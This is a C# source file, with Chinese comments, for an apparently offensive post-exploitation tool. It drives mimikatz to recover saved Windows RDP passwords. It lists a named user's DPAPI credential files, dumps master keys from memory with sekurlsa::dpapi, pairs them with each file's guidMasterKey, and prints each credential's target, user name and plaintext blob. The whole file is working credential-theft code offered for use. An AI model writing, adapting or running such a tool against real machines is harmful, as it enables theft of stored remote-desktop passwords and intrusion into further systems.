using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace RDP_Credential_Async
{
    class Program
    {
       
        public static void Main(string[] args)
        {
            string judgeUser = "-u";

            //检测是否符合 -u administrator，符合向下继续运行
            if (args.Length == 2 && args[0].Equals(judgeUser, StringComparison.OrdinalIgnoreCase))
            {
                //获取当前程序基目录
                string current_path = System.AppDomain.CurrentDomain.BaseDirectory;

                //将mimikatz启动目录设置为当前目录
                string mimikatz_path = current_path + "mimikatz.exe";

                //判断当前目录是否存在mimikatz文件,存在向下继续执行
                if (File.Exists(mimikatz_path))
                {

                    Cmd cmd = new Cmd();
                    //获取当前用户此目录下RDP密码文件
                    string RDP_pass_file = cmd.RunCmd($@"dir /a C:\Users\{args[1]}\AppData\Local\Microsoft\Credentials\*");
                    Regex regex_RDP_pass_file = new Regex(@"[a-zA-Z0-9]{32}");
                    MatchCollection res_RDP_pass_file = regex_RDP_pass_file.Matches(RDP_pass_file);
                    List<string> rdp_PassFileList = new List<string>();

                    //把 rdp密码文件添加到 rdp_PassFileList
                    int rdpPass = 0;
                    while (rdpPass < res_RDP_pass_file.Count)
                    {
                        rdp_PassFileList.Insert(rdpPass, res_RDP_pass_file[rdpPass].ToString());
                        rdpPass++;
                    }


                    //根据rdp密码文件解出 guidMasterKey，并添加到 guidMasterKey_List
                    List<string> guidMasterKey_List = new List<string>();
                    int guidMasterKey_Num = 0;
                    while (guidMasterKey_Num < rdp_PassFileList.Count)
                    {
                        
                        string decrypt_passFile = cmd.RunCmd(
                            $@"""{mimikatz_path}"" ""privilege::debug"" ""dpapi::cred /in:C:\Users\{args[1]}\AppData\Local\Microsoft\Credentials\{rdp_PassFileList[guidMasterKey_Num]}"" exit");
                        
                        string guidMasterKey_final = string.Empty;
                        Regex regex_guidMasterKey = new Regex(@"guidMasterKey.*");
                        MatchCollection res_guidMasterKey = regex_guidMasterKey.Matches(decrypt_passFile);
                        foreach (var guidMasterKey_first in res_guidMasterKey)
                        {
                            string guidMasterKey_second = Regex.Replace(guidMasterKey_first.ToString(), @"\s", "");
                            string guidMasterKey_third = guidMasterKey_second.Replace("guidMasterKey:{", "");
                            guidMasterKey_final = guidMasterKey_third.Replace("}", "");
                            guidMasterKey_List.Insert(guidMasterKey_Num, guidMasterKey_final);
                            guidMasterKey_Num++;
                        }
                    }


                    //根据guidMasterKey找到对应的Masterkey
                    string Masterkey =
                        cmd.RunCmd($@"""{mimikatz_path}"" ""privilege::debug"" ""sekurlsa::dpapi"" exit");
                    //定义 guidList 和 MasterkeyList 下面添加用
                    List<string> guidList = new List<string>();
                    List<string> MasterkeyList = new List<string>();

                    //正则提取 Guid(对应guidMasterKey的值) 和 MasterKey
                    Regex regex_Guid = new Regex(@"GUID.*");
                    Regex regex_Masterkey = new Regex(@"MasterKey.*");
                    MatchCollection res_guid = regex_Guid.Matches(Masterkey);
                    MatchCollection res_Masterkey = regex_Masterkey.Matches(Masterkey);

                    //添加到 guidList
                    int guid = 0;
                    while (guid < res_guid.Count)
                    {

                        string res_guid_first = Regex.Replace(res_guid[guid].ToString(), @"\s", "");
                        string res_guid_second = res_guid_first.Replace("GUID:{", "");
                        string res_guid_final = res_guid_second.Replace("}", "");
                        guidList.Insert(guid, res_guid_final);
                        guid++;

                    }

                    //添加到 MasterkeyList
                    int MasterKey = 0;
                    while (MasterKey < res_Masterkey.Count)
                    {
                        string res_key_first = Regex.Replace(res_Masterkey[MasterKey].ToString(), @"\s", "");
                        string res_key_final = res_key_first.Replace("MasterKey:", "");
                        MasterkeyList.Insert(MasterKey, res_key_final);
                        MasterKey++;
                    }


                    //循环判断 guidMasterKey_List 中的元素是否在 guidList 中，如果在，则输出该元素的索引值
                    int guidMasterKey_List_judge = 0;
                    while (guidMasterKey_List_judge < guidMasterKey_List.Count)
                    {
                        if (guidList.IndexOf(guidMasterKey_List[guidMasterKey_List_judge]) != -1)
                        {
                            int guidMasterKey_List_Num = guidList.IndexOf(guidMasterKey_List[guidMasterKey_List_judge]);

                            string decrypt =
                                cmd.RunCmd(
                                    $@"""{mimikatz_path}"" ""privilege::debug"" ""dpapi::cred /in:C:\Users\{args[1]}\AppData\Local\Microsoft\Credentials\{rdp_PassFileList[guidMasterKey_List_judge]} /masterkey:{MasterkeyList[guidMasterKey_List_Num]}"" exit");

                            Regex regex_UserName = new Regex(@"UserName.*");
                            Regex regex_CredentialBlob = new Regex(@"CredentialBlob.*");
                            Regex regex_TargetName = new Regex(@"TargetName.*");
                            string final_res_UserName = string.Empty;
                            string final_CredentialBlob = string.Empty;
                            string final_TargetName = string.Empty;
                            MatchCollection res_UserName_first = regex_UserName.Matches(decrypt);
                            MatchCollection res_CredentialBlob_first = regex_CredentialBlob.Matches(decrypt);
                            MatchCollection res_TargetName_first = regex_TargetName.Matches(decrypt);
                            foreach (var res_UserName_second in res_UserName_first)
                            {
                                final_res_UserName = res_UserName_second.ToString();
                            }

                            foreach (var res_CredentialBlob_second in res_CredentialBlob_first)
                            {
                                final_CredentialBlob = res_CredentialBlob_second.ToString();
                            }

                            foreach (var res_TargetName_second in res_TargetName_first)
                            {
                                final_TargetName = res_TargetName_second.ToString();
                            }

                            Console.WriteLine(final_TargetName);
                            Console.WriteLine(final_res_UserName);
                            Console.WriteLine(final_CredentialBlob);
                            Console.Write("\r\n");
                            
                        }
                        guidMasterKey_List_judge++;
                    }

                }
                else
                {
                    Console.WriteLine("当前目录下不存在mimikatz.exe，请检查mimikatz.exe");
                }
            }
            else
            {
                Console.WriteLine("rpdCredential.exe -u administrator");
            }

        }
        
    }
}
